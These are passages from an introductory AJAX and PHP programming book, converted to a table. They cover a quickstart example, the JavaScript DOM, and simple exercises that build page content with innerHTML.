Larger Text,Smaller Text,Symbol
What just happened?,"Here comes the fun part—understanding what happens in that code. (Remember 
 that we'll discuss much more technical details over the following chapters.)
  
 It all begins with 
 index.html,
  which references a mysterious JavaScript file called 
 quickstart.js
  and builds a very simple web interface. In the following code snippet 
 from 
 index.html
 , notice the elements highlighted in bold:
  
  <body 
 onload='process()'
 >
  
  Server wants to know your name:
  
  <input type=""text"" id=""myName"" />
  
  <div id=""divMessage"" />
  
  </body>
  
 When the page loads, a function from 
 quickstart.js
  called 
 process()
  gets 
 executed. We will see how this causes the 
 <div>
  element to be populated with a 
 message from the server in a moment. 
  
 On the web server, you have a script called 
 quickstart.php
  that builds an XML 
 message to send to the client. This XML message consists of a 
 <response>
  element 
 that packages the message the server needs to send back to the client:
  
 <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> 
 <response>
  
  
  ... message the server wants to transmit to the client ...
  
 </response>
  
 If the username received from the client is empty, the message we write in the 
 <response>
  element is 
 Stranger, please tell me your name!
 . If the name is 
 Yoda
 , 
 Audra
 , 
 Bogdan
 , or 
 Cristian
 , the server responds with 
 Hello, master <name>!
 . If the 
 name is anything else, the message will be 
 <name>, I don't know you!
  So if 
 Mickey 
 Mouse
  types his name, the server will send back the following XML structure:
  
 <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> 
 <response>
  
  
  Mickey Mouse, I don't know you!
  
 </response>
  
 Let's take a quick look at how 
 quickstart.php
  generates the appropriate XML. 
 The script starts by generating the XML document header and the opening 
 <response>
  element:
  
 <?php 
  
 // we'll generate XML output 
  
 header('Content-Type: text/xml'); 
  
 // generate XML header
  
 [
  27 
 ]",NA
Summary,"This chapter was all about a quick introduction to the world of AJAX. In order to proceed 
 with learning how to build AJAX applications, it's important to understand why and where 
 they are useful. As with any other technology, AJAX isn't the answer to all problems, but it 
 offers powerful means to address some of them.
  
 AJAX combines client-side and server-side functionality to enhance the user 
 experience of your site. The 
 XMLHttpRequest
  object is the key element that enables 
 the client-side JavaScript code to call a page on the server asynchronously. This 
 chapter was intentionally short and probably has left you with many questions—that's 
 good! Be prepared for a whole book dedicated to answering questions and 
 demonstrating lots of interesting functionality!
  
 [
  34 
 ]",NA
JavaScript and the AJAX ,NA,NA
Client,"We hope that the first chapter has whetted your appetite for AJAX enough and you're 
 now ready to take on a second chapter packed with even more theory and exercises. If 
 you found the first exercise challenging, you can breathe easier—there's no better way 
 to learn than by example and we will present you with several short ones to get you on 
 your way. In this chapter, we'll be taking a longer and more detailed look at client-side 
 AJAX technologies including:
  
 •
  
 JavaScript and the JavaScript Document Object Model (DOM)
  
 •
  
 Cascading Style Sheets (CSS)
  
 •
  
 The XMLHttpRequest object
  
 •
  
 Extensible Markup Language (XML)
  
 We're going to discuss the theory (and practice) that you will need to know to make 
 these components come together smoothly and form a solid foundation for your future 
 AJAX applications. You will see how to implement simple error-handling techniques, and 
 how to write code efficiently. Chapter 3, 
 Object Oriented JavaScript
 , will complete the 
 client-side foundations by teaching Object Oriented Javascript.",NA
JavaScript and the Document Object ,NA,NA
Model,"JavaScript is the heart of AJAX. As mentioned in Chapter 1, 
 The World of AJAX and 
 PHP
 , JavaScript is a 
 parsed language
  (not compiled); it has 
 Object-Oriented 
 Programming
  (
 OOP
 ) capabilities and a syntax similar to C. JavaScript wasn't 
 intended for large applications, but powerful frameworks (such as jQuery, the 
 Microsoft AJAX Library, prototype, and others) have been developed based on 
 features introduced in newer versions of the language. 
  
 JavaScript is fully supported by the vast majority of web browsers. As JavaScript 
 programs are parsed, their code must arrive unaltered at the client for execution. This 
 is both a strength and a weakness, and you 
 must
  bear it in mind when writing your 
 JavaScript code.
  
 Part of JavaScript's power resides in its ability to manipulate the parent HTML 
 document, and it does this through the DOM interface. The DOM has the ability to 
 manipulate XML-like documents (HTML included) and is supported by a multitude of 
 languages and technologies (JavaScript, Java, PHP, C#, and C++ to name a few). 
  
 In this chapter, we'll delve into using the DOM with both JavaScript and PHP.
  
  
 Feeling a little thin on these two? Don't worry! At the end of this section, 
  
  
 we've included a list of links to go to for more information, tutorials, and 
  
 background on JavaScript and the DOM. Feel free to take them in now, 
  
 before continuing—we'll wait!
  
 On the client side, you will use the DOM and JavaScript in order to:
  
 •
  
 Manipulate the HTML page while you are working on it
  
 •
  
 Read and parse XML documents received from the server
  
 •
  
 Create new XML documents
  
 On the server side, you can use the DOM and PHP in order to:
  
 •
  
 Compose XML documents, usually for sending them to the client 
  
 •
  
 Read XML documents received from various sources
  
 [
  36 
 ]",NA
Time for action – playing with JavaScript and the DOM ,"In keeping with the time-honored beginning example of 
 HelloWorld!
  output, we're 
 going to use the DOM to display a nice 
 Hello, world!
  on the web page (unless you 
 execute it between 10 pm and 5 am, in which case it will nag you with 
 You should go to 
 sleep
 ). We'll start by creating our folders and then creating the necessary files. 
  
  
 All exercises from this book assume that you've installed your machine as 
  
  
 shown in the Appendix. 
  
 1. Create a folder called 
 javascript
  in your 
 ajax
  folder. This folder will 
  
 be used for all the examples in this chapter and the next chapter.
  
 2. In the 
 javascript
  folder, create a subfolder called 
 jsdom
 .
  
 3. In the 
 jsdom
  folder, add a file called 
 jsdom.html
 , with the following 
  
 code in it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www. 
 w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 <html>
  
  <head>
  
  <title>AJAX Foundations: JavaScript and DOM</title>
  
  <script type=""text/javascript"" src=""jsdom.js""></script>
  
  </head>
  
  <body>
  
  I'm Body.
  
  </body>
  
 </html> 
  
 [
  39 
 ]",NA
What just happened?,"The code is very simple, so it doesn't need a lot of explanation, but here are the main 
 ideas you should know:
  
 •
  
 JavaScript doesn't require you to declare the variables, so in theory you can 
  
 avoid the 
 var
  keywords. This isn't a recommended practice though (it's 
  
 always better to be clear and explicit in your code).
  
 •
  
 The JavaScript script executes automatically when the HTML file is loaded. 
  
 Alternatively, you can group the code into functions and execute them by 
  
 explicitly calling them instead. More on that follows next!
  
  
 spiders (in this example, they won't see 
 Hello World
  or 
 You should go 
  
 to sleep
 . 
 However, they will see 
 I'm Body
 ). If search engine optimization 
  
 is a 
 concern, keep in mind to never output indexable content using only 
  
 JavaScript.
  
  
 Remember! The text generated by your JavaScript code isn't visible to the 
 clients that don't execute JavaScript code, such as search engine 
  
 •
  
 The JavaScript code in 
 jsdom.js
  is executed 
 when the file is referenced, before 
  
 parsing the remaining HTML
 ; in our example, this is in the 
 <head>
  section, 
  
 which explains why 
 Hello World!
  appears before 
 I'm Body
 . One of the 
  
 problems with the example is that you have no control in the JavaScript code 
  
 over where the output should be displayed. Needless to say, this is a bit 
  
 disconcerting and rather awkward.
  
 Except for the most simple of cases, having just JavaScript code that executes 
 unconditionally when the HTML page loads isn't going to work well for you. Usually 
 you'll want to have more control over when, where, and how portions of JavaScript 
 code execute. The most typical scenario uses JavaScript 
 functions
  that execute in 
 response to certain 
 events
  being triggered (such as clicking on a button).",NA
JavaScript events and the DOM,"In the next exercise, we will create an HTML structure from JavaScript code. 
  
 When preparing to build a web page that has dynamically generated parts, 
  
 you first need to create its 
 template
  (which contains the static parts), and use 
 placeholders
  for the dynamic parts. The placeholders must be uniquely identifiable 
 HTML elements (elements with the 
 ID
  attribute set).",NA
Time for action – using JavaScript events and the DOM ,"1. In the 
 ajax/javascript
  folder, create a folder named 
 events
 . 
  
  
 2. In the 
 events
  folder, create a file named 
 events.html
  and type the 
  
  
 following code in it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html>
  
  
  <head>
  
  
  <title>AJAX Foundations: JavaScript Events and DOM</title>
  
  <script type=""text/javascript"" src=""events.js""></script>
  
  
 </head>
  
  
  <body onload=""process()"">
  
  
  <p>Hey dude! Here's a cool list of colors for you:</p>
  
  
 <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 3. Create a new file named 
 events.js
 , and type the following code:
  
 function process() 
  
 {
  
  
  // Create the HTML code
  
  
  var string;
  
  
  string = ""<ul>""
  
  
  + ""<li>Black</li>""
  
  
  + ""<li>Orange</li>""
  
  
  + ""<li>Pink</li>""
  
  
  + ""</ul>"";
  
  
  // obtain a reference to the <div> element on the page
  
  myDiv = document.getElementById(""myDivElement"");
  
  
  // add content to the <div> element
  
  
  myDiv.innerHTML = string; 
  
 }
  
 [
  43 
 ]",NA
